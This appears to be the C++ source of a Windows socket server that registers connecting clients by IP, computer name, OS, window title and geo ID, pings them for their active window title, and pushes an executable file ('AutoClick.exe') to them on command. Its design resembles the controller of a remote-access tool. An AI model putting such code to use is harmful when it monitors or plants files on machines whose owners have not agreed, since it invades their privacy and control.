//
// Created by LUNAFE on 2022-02-09.
//

#include "handling.h"

void handling::Listening() {
#ifdef DEBUG
    printf("[DEBUG] LISTENING\n");
#endif
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);

    SOCKET server_sock;
    server_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_sock == -1) {
#ifdef DEBUG
        printf("[DEBUG] SOCKET_ERROR_LISTENING\n");
#endif
        system("pause");
        return;
    }

    SOCKADDR_IN server_addr = {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(PORT);

    if (bind(server_sock, (sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
#ifdef DEBUG
        printf("[DEBUG] BIND_ERROR\n");
#endif
        system("pause");
        return;
    }

    if (listen(server_sock, SOMAXCONN) == -1) {
#ifdef DEBUG
        printf("[DEBUG] LISTEN_ERROR\n");
#endif
        system("pause");
        return;
    }

    SOCKADDR_IN client_addr = {};
    int addr_size = sizeof(client_addr);
    while (true) {
        SOCKET client_sock = INVALID_SOCKET;
        client_sock = accept(server_sock, (SOCKADDR *) &server_addr, &addr_size);
        if (client_sock != INVALID_SOCKET) {
#ifdef DEBUG
            wprintf(L"[DEBUG] ACCEPTED\n");
#endif
            std::thread handle_thread(handling::Handler, client_sock);
            handle_thread.detach();
        } else if (client_sock == INVALID_SOCKET) {
#ifdef DEBUG
            wprintf(L"\n[DEBUG] INVALID_SOCKET\n");
#endif
        } else {
#ifdef DEBUG
            wprintf(L"[DEBUG] UNKNOWN_ERROR\n");
#endif
        }
    }
}

void handling::Handler(SOCKET socket) {
    packet init_packet;
    int result = init_packet.Receive(socket);
    if (result == -1) {
#ifdef DEBUG
        wprintf(L"[DEBUG] SOCKET_INIT_ERROR\n");
#endif
        return;
    } else if (result == 1) {
        PACKET_TYPE *type = init_packet.get_type();
        char *task_id = init_packet.get_task_id();
#ifdef DEBUG
        wprintf(L"[DEBUG] PACKET_TYPE: %d\n[DEBUG] PACKET_TASK_ID: %s\n", *type, task_id);
#endif
        struct INFO *init_info = (struct INFO *) init_packet.get_data();
        time_t current_time = time(NULL);
        client *new_client = new client(socket, current_time, init_info);
        client_list::Add(new_client);
#ifdef DEBUG
        struct tm *local_time = localtime(&current_time);
        wprintf(L"[DEBUG] CLIENT_CLASS_ADD\n");
        wprintf(L"[DEBUG] current_time: %04d-%02d-%02dT%02d:%02d:%02d\n", local_time->tm_year + 1900,
                local_time->tm_mon + 1, local_time->tm_mday,
                local_time->tm_hour, local_time->tm_min, local_time->tm_sec);
        wchar_t ip[16];
        wchar_t name[32];
        wchar_t os[16];
        wchar_t title[128];
        wchar_t id[8];

        util::CharToWchar(ip, init_info->ip_address);
        util::CharToWchar(name, init_info->computer_name);
        util::CharToWchar(os, init_info->os_version);
        util::CharToWchar(title, init_info->window_title);
        util::CharToWchar(id, init_info->geo_id);


        wprintf(L"[DEBUG] ip: %S\n[DEBUG] name: %S\n[DEBUG] os: %S\n[DEBUG] window_title: %S\n[DEBUG] geo_id: %S\n",
                ip, name, os, title, id);
#endif
        while (true) {
            if (!main::isActive) {
                packet ping_packet;
                util::MakePing(&ping_packet);

                int result = ping_packet.Send(socket);

                if (result == -1) {
                    client_list::Remove(socket);
#ifdef DEBUG
                    wprintf(L"[DEBUG] SOCKET_PING_ERROR\n");
#endif
                    return;
                } else if (result == 0) {
#ifdef DEBUG
                    wprintf(L"[DEBUG] PING_SENT\n");
#endif
                    packet receive_packet;
                    int result = receive_packet.Receive(socket);
                    if (result == -1) {
                        client_list::Remove(socket);
#ifdef DEBUG
                        wprintf(L"[DEBUG] SOCKET_PONG_ERROR\n");
#endif
                        return;
                    } else if (result == 0) {
#ifdef DEBUG
                        wprintf(L"[DEBUG] PONG_RECEIVED!\n");
                        wchar_t title[128];
                        util::CharToWchar(title, receive_packet.get_data());
                        wprintf(L"[DEBUG] ACTIVE_WINDOW: %S\n", title);
#endif
                    } else {
                        client_list::Remove(socket);
#ifdef DEBUG
                        wprintf(L"[DEBUG] WRONG_PACKET_TYPE\n");
#endif
                        return;
                    }
                }
            } else if (main::isActive) {
                main::isActive = false;

                //create new file_handler
                packet request_packet;
                request_packet.set_type(PACKET_TYPE::FILE_SERVER_TO_CLIENT);

                char id[16];
                util::GenId(id, 16);
                request_packet.set_task_id(id);
                request_packet.set_current_index(0);
                request_packet.set_final_index(4);

                if (request_packet.Send(socket) == -1) {
#ifdef DEBUG
                    wprintf(L"[DEBUG_TRANSFER] ERROR_REQUEST_SEND\n");
#endif
                    return;
                } else {
#ifdef DEBUG
                    wprintf(L"[DEBUG_TRANSFER] REQUEST_SEND\n");
#endif
                }
            }
            Sleep(1000);
        }
    } else if (result == 2) {
#ifdef DEBUG
        wprintf(L"[DEBUG_TRANSFER] TRANSFER_PACKET\n");
#endif
        wchar_t path[MAX_PATH] = L"C:\\Users\\LUNAFE\\Desktop\\AutoClick.exe";
        std::thread handle_thread(file_handler::SendFileThread, socket, path);
        handle_thread.join();
    } else {
#ifdef DEBUG
        wprintf(L"[DEBUG] SOCKET_INFO_ERROR\n");
#endif
    }
    Sleep(1000);
}